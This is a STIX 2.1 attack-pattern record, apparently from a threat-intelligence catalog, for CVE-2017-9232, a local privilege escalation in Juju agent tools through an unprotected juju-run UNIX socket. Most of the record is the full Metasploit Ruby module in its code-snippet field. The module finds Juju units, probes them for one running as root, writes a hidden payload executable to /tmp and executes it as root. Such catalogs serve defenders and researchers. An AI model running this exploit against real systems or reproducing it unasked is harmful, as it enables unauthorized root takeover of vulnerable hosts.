{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49e82c00-71bc-4eca-964d-9e55d5aea699",
    "created": "2024-08-14T16:59:01.291702Z",
    "modified": "2024-08-14T16:59:01.291706Z",
    "name": "Juju-run Agent Privilege Escalation",
    "description": " This module attempts to gain root privileges on Juju agent systems running the juju-run agent utility.  Juju agent systems running agent tools prior to version 1.25.12 2.0.x before 2.0.4, and 2.1.x before 2.1.3, provide a UNIX domain socket to manage software (\"units\") without setting appropriate permissions allowing unprivileged local users to execute arbitrary commands as root.  This module has been tested successfully with Juju agent tools versions 1.18.4, 1.25.5 and 1.25.9 on Ubuntu 14.04.1 LTS x86 deployed by Juju 1.18.1-trusty-amd64 and 1.25.6-trusty-amd64 on Ubuntu 14.04.1 LTS x86_64.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/juju_run_agent_priv_esc.rb",
            "external_id": "juju_run_agent_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9232"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/juju/+bug/1682411"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Juju-run Agent Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Juju agent systems\n        running the juju-run agent utility.\n\n        Juju agent systems running agent tools prior to version 1.25.12,\n        2.0.x before 2.0.4, and 2.1.x before 2.1.3, provide a UNIX domain socket\n        to manage software (\"units\") without setting appropriate permissions,\n        allowing unprivileged local users to execute arbitrary commands as root.\n\n        This module has been tested successfully with Juju agent tools versions\n        1.18.4, 1.25.5 and 1.25.9 on Ubuntu 14.04.1 LTS x86 deployed by Juju\n        1.18.1-trusty-amd64 and 1.25.6-trusty-amd64 on Ubuntu 14.04.1 LTS x86_64.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Ryan Beisner', # Discovery and PoC\n          'David Ames (@thedac)', # Discovery and PoC\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2017-04-13',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'References'     =>\n        [\n          [ 'CVE', '2017-9232' ],\n          [ 'BID', '98737' ],\n          [ 'URL', 'https://bugs.launchpad.net/juju/+bug/1682411' ]\n        ]\n    ))\n    register_options(\n      [\n        OptString.new('UNIT', [ false, 'A valid Juju unit name', '' ]),\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n      ])\n  end\n\n  def check\n    juju_run_path = cmd_exec 'which juju-run'\n\n    if juju_run_path.start_with? '/'\n      vprint_good 'juju-run is installed'\n      return CheckCode::Detected\n    end\n\n    vprint_error 'juju-run is NOT installed'\n\n    CheckCode::Safe\n  end\n\n  def unit_names\n    units = []\n\n    cmd_exec('/bin/ls -m /var/log/juju/*.log').chomp.split(/,\\s*/).each do |log|\n      units << ::File.basename(log).gsub(/\\.log$/, '')\n    end\n\n    cmd_exec('/bin/ls -m /var/lib/juju/agents/').chomp.split(/,\\s*/).each do |agent|\n      units << ::File.basename(agent)\n    end\n\n    units.uniq\n  end\n\n  def execute_command(cmd, opts = {})\n    cmd_exec \"juju-run #{opts['unit']} '#{cmd}'\"\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    cmd_exec \"chmod +x '#{path}'\"\n    register_file_for_cleanup path\n  end\n\n  def exploit\n    if check != CheckCode::Detected\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    units = datastore['UNIT'].blank? ? unit_names : [ datastore['UNIT'] ]\n\n    if units.empty?\n      fail_with Failure::Unknown, \"Could not find any Juju units. Try specifying a 'UNIT'\"\n    end\n\n    # Check each unit for a privileged socket\n    print_status \"Trying #{units.size} units...\"\n\n    socket_unit = nil\n    unit_names.each do |unit|\n      id = execute_command 'id', 'unit' => unit\n\n      if id.include? 'root'\n        print_good \"Unit #{unit.inspect} uses a privileged socket\"\n        socket_unit = unit\n        break\n      end\n    end\n\n    if socket_unit.nil?\n      fail_with Failure::NotVulnerable, 'Could not find any Juju units using a privileged socket'\n    end\n\n    # Upload payload executable\n    payload_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    payload_path = \"#{datastore['WritableDir']}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Execute payload executable\n    vprint_status 'Executing payload...'\n    execute_command payload_path, 'unit' => socket_unit\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-13",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}